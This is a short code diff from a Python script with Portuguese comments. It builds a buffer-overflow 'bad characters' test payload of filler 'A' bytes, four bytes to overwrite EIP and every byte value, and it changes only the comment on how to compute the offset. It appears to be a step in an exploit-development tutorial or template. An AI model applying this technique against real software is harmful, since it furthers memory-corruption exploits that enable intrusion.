@@ -47,7 +47,7 @@ def bad_chars():
     # Converta a lista de inteiros em um objeto de bytes
     all_chars_bytes = bytes(all_chars)
     
-    offset = #coloque aqui o tamanho do EIP conseguido nas etapas anteriores
+    offset = #coloque aqui o tamanho do EIP conseguido nas etapas anteriores - 256 (valor da lista) - 4 (local do eip)
     buffer = b"A" * offset
     eip = b"B" * 4
     payload = buffer + eip + all_chars_bytes  # Concatene bytes em vez de uma lista
